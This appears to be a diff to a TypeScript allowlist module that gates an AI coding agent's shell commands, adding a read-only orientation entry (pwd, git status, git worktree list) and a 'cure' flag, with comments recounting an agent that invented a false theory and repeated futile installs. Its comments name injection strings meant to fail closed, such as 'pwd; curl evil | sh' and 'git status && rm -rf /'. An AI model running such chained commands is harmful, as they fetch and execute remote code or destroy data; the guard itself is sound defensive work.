@@ -258,6 +258,50 @@ const INSTALL_HOOKS_BODY_JS =
 export const INSTALL_HOOKS_ALLOW_JS =
     new RegExp(CD_PREFIX_JS_ANCHORED + INSTALL_HOOKS_BODY_JS + CAPTURE_TAIL_JS_SRC);
 
+// READ-ONLY ORIENTATION — the 2026-08-03 "where am I standing?" deadlock.
+//
+// Every entry above is a CURE. None of them tells you WHICH TREE you are in, and that is the one thing
+// an agent has to know before a cure can work. The incident: an agent worked in a linked worktree while
+// the drift fault (D) was measured against the PRIMARY clone ($CLAUDE_PROJECT_DIR). Its `pnpm install`
+// ran in the worktree, succeeded, and changed nothing in the tree being measured, so the block never
+// lifted. It could not run `pwd` — read-only bash was not on this list at all — so it could not see the
+// discrepancy, invented a false theory ("the harness is stripping my `cd` prefix"), burned five
+// identical installs and handed the problem back to the human. One allowed `pwd` ends that on attempt
+// one.
+//
+// So this entry is not a cure, it is the DIAGNOSIS the cures depend on: where am I (`pwd`,
+// `git rev-parse --show-toplevel`), which tree is this (`git worktree list`), which branch and what
+// state (`git status`, `git branch`, `git log`, `git diff`, `git show`). All local, all read-only, none
+// of them touching the network or the working tree. The sibling guard merged-branch-bash-guard already
+// permits `git status|log|diff|show|branch`, so this is the policy that already exists, applied one
+// layer out.
+//
+// THE `git worktree` TRAP. `git worktree add|remove|prune|move|repair` all MUTATE, and `git worktree`
+// is the ONLY multi-word subcommand here — which is exactly why it gets its own alternative pinned to
+// the LITERAL word `list` rather than joining the single-word set. A bare `git worktree` matches
+// nothing, and no other subcommand can reach the accepted branch. Deny cases for `add`/`remove` are
+// explicit in shim-drift.spec.ts.
+//
+// Kept at exactly the tightness of SYNC_BODY_ERE — the same argument token, `--flag` or a bare word
+// from a character class holding no shell metacharacter — so nothing can ride along: `pwd; curl evil |
+// sh`, `git status && rm -rf /`, `git log $(curl evil)` and `git status | sh` all FAIL CLOSED. Note the
+// subcommand word must follow `git` IMMEDIATELY: `git -c core.pager=evil status` and `git -C /other
+// status` stay denied, the same property the sync entry has.
+// Keep in sync with ORIENT_ALLOW_JS below (locked by a unit test).
+const ORIENT_BODY_ERE =
+    '(pwd|git[[:space:]]+(status|log|diff|show|branch|rev-parse)|git[[:space:]]+worktree[[:space:]]+list)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*';
+export const ORIENT_ALLOW_ERE =
+    CD_PREFIX_ERE_ANCHORED + ORIENT_BODY_ERE + CAPTURE_TAIL_ERE;
+
+// JS-regex twin of ORIENT_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
+const ORIENT_BODY_JS =
+    '(pwd|git\\s+(status|log|diff|show|branch|rev-parse)|git\\s+worktree\\s+list)(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._\\/@:-]*)*';
+export const ORIENT_ALLOW_JS =
+    new RegExp(CD_PREFIX_JS_ANCHORED + ORIENT_BODY_JS + CAPTURE_TAIL_JS_SRC);
+
+// The command the incident turned on: the agent could not ask which tree it was standing in.
+export const ORIENT_CMD = 'pwd';
+
 // The exact command the self-guard's deny names FIRST. Present in every release that has a shim.
 export const INSTALL_HOOKS_CMD = 'pnpm exec wp-install-ai-hooks';
 
@@ -314,12 +358,23 @@ export class L0Call {
  * `extraSamples` pins ADDITIONAL spellings the same entry must accept. A spelling that some deny
  * message prescribes belongs here, or nothing stops a later tightening of the pattern from making that
  * message's cure untypable again — which is the deadlock shape this whole module exists to prevent.
+ *
+ * `cure` is the ONE thing that is not uniform across the list, and it is not about L0 at all — see
+ * L0_CURE_ALLOW_JS below. Every entry is judged identically while an L0 fault is up; `cure` decides
+ * only whether the entry ALSO bypasses the downstream (L1) guards on a HEALTHY tree.
  */
 export class L0AllowEntry {
     // eslint-disable-next-line @typescript-eslint/max-params
     constructor(
         readonly label: string,
         readonly kind: 'pass' | 'allow',
+        /**
+         * True when this entry REPAIRS the tooling (install, sync, shim restore). A cure has to run
+         * before webpieces.config.json can even be loaded, so it bypasses everything, always. A
+         * non-cure (read-only orientation) is allowed while a fault is up and is otherwise an ordinary
+         * command the downstream guards still judge.
+         */
+        readonly cure: boolean,
         readonly ere: string | null,
         readonly js: string | null,
         readonly sample: L0Call,
@@ -333,23 +388,35 @@ export class L0AllowEntry {
 }
 
 export const L0_ALLOWLIST: readonly L0AllowEntry[] = [
-    new L0AllowEntry('any Read', 'pass', null, null, new L0Call('Read', '', 'README.md')),
-    new L0AllowEntry(`a Write/Edit whose target is ${CONFIG_FILENAME}`, 'pass', null, null,
+    new L0AllowEntry('any Read', 'pass', false, null, null, new L0Call('Read', '', 'README.md')),
+    new L0AllowEntry(`a Write/Edit whose target is ${CONFIG_FILENAME}`, 'pass', false, null, null,
         new L0Call('Edit', '', `/repo/${CONFIG_FILENAME}`)),
-    new L0AllowEntry('pnpm|npm install', 'allow', INSTALLER_BODY_ERE, INSTALLER_BODY_JS,
+    new L0AllowEntry('pnpm|npm install', 'allow', true, INSTALLER_BODY_ERE, INSTALLER_BODY_JS,
         new L0Call('Bash', 'pnpm install', '')),
-    new L0AllowEntry(`${RECOVERY_CMD} - the cure for a CORRUPT node_modules`, 'allow', RECOVERY_BODY_ERE, RECOVERY_BODY_JS,
+    new L0AllowEntry(`${RECOVERY_CMD} - the cure for a CORRUPT node_modules`, 'allow', true, RECOVERY_BODY_ERE, RECOVERY_BODY_JS,
         new L0Call('Bash', RECOVERY_CMD, '')),
     // webpieces-disable no-fetch -- prose naming the git sync commands in a doc label, not an HTTP call
-    new L0AllowEntry('git pull / git fetch - merge is NOT on the list', 'allow', SYNC_BODY_ERE, SYNC_BODY_JS,
+    new L0AllowEntry('git pull / git fetch - merge is NOT on the list', 'allow', true, SYNC_BODY_ERE, SYNC_BODY_JS,
         new L0Call('Bash', 'git pull', '')),
-    new L0AllowEntry(UPGRADE_SHIM_CMD, 'allow', UPGRADE_SHIM_BODY_ERE, UPGRADE_SHIM_BODY_JS,
+    new L0AllowEntry(UPGRADE_SHIM_CMD, 'allow', true, UPGRADE_SHIM_BODY_ERE, UPGRADE_SHIM_BODY_JS,
         new L0Call('Bash', UPGRADE_SHIM_CMD, '')),
-    new L0AllowEntry(RESTORE_SHIM_CMD, 'allow', RESTORE_SHIM_BODY_ERE, RESTORE_SHIM_BODY_JS,
+    new L0AllowEntry(RESTORE_SHIM_CMD, 'allow', true, RESTORE_SHIM_BODY_ERE, RESTORE_SHIM_BODY_JS,
         new L0Call('Bash', RESTORE_SHIM_CMD, '')),
-    new L0AllowEntry(`${INSTALL_HOOKS_CMD} (flags allowed, e.g. --target=project)`, 'allow', INSTALL_HOOKS_BODY_ERE, INSTALL_HOOKS_BODY_JS,
+    new L0AllowEntry(`${INSTALL_HOOKS_CMD} (flags allowed, e.g. --target=project)`, 'allow', true, INSTALL_HOOKS_BODY_ERE, INSTALL_HOOKS_BODY_JS,
         new L0Call('Bash', INSTALL_HOOKS_CMD, ''),
         [new L0Call('Bash', INSTALL_HOOKS_TARGET_CMD, '')]),
+    // NOT a cure (`cure: false`): it repairs nothing, so it must not bypass the L1 guards on a healthy
+    // tree — `git status` from a subdirectory still meets force-to-root. It is on the L0 list because
+    // while a fault is UP you have to be able to see where you are standing.
+    new L0AllowEntry(
+        'read-only orientation: pwd, git status/log/diff/show/branch/rev-parse, git worktree list',
+        'allow', false, ORIENT_BODY_ERE, ORIENT_BODY_JS,
+        new L0Call('Bash', ORIENT_CMD, ''),
+        [
+            new L0Call('Bash', 'git rev-parse --show-toplevel', ''),
+            new L0Call('Bash', 'git worktree list', ''),
+            new L0Call('Bash', 'git status', ''),
+        ]),
 ];
 
 const L0_BODIES_ERE = L0_ALLOWLIST.flatMap((e: L0AllowEntry): string[] => (e.ere === null ? [] : [e.ere]));
@@ -374,6 +441,23 @@ export const L0_ALLOW_ERE_SH = L0_ALLOW_ERE.split("'").join(`'\\''`);
 // JS twin of L0_ALLOW_ERE. A unit test asserts the two agree on a shared sample set.
 export const L0_ALLOW_JS =
     new RegExp(CD_PREFIX_JS_ANCHORED + '(' + L0_BODIES_JS.join('|') + ')' + CAPTURE_TAIL_JS_SRC);
+
+// The CURE subset of the same list — the entries that REPAIR the tooling.
+//
+// This is not a second allowlist and it is not an L0 concept. It exists because runner.ts consults the
+// L0 patterns in a place where NO fault has been established: ahead of loading webpieces.config.json,
+// so that a config the installed validator cannot parse (or one that is a release AHEAD of it) cannot
+// trap the `pnpm install` that fixes exactly that. That bypass skips every L1 guard as well, which is
+// correct for a repair command and WRONG for anything else.
+//
+// So when read-only orientation joined the list, it had to join it as a NON-cure. Otherwise adding
+// `pwd` would silently have switched off force-to-root for `git status`, `git log` and `git diff` on a
+// perfectly healthy repo — a guard deleted as a side effect of a diagnostic. Under an actual fault
+// isAllowed() still answers for the WHOLE list, orientation included; the split changes nothing there.
+const L0_CURE_BODIES_JS = L0_ALLOWLIST.flatMap(
+    (e: L0AllowEntry): string[] => (e.js === null || !e.cure ? [] : [e.js]));
+export const L0_CURE_ALLOW_JS =
+    new RegExp(CD_PREFIX_JS_ANCHORED + '(' + L0_CURE_BODIES_JS.join('|') + ')' + CAPTURE_TAIL_JS_SRC);
 
 // The non-Bash half of the same list, kept here so sh and JS answer the identical question.
 //
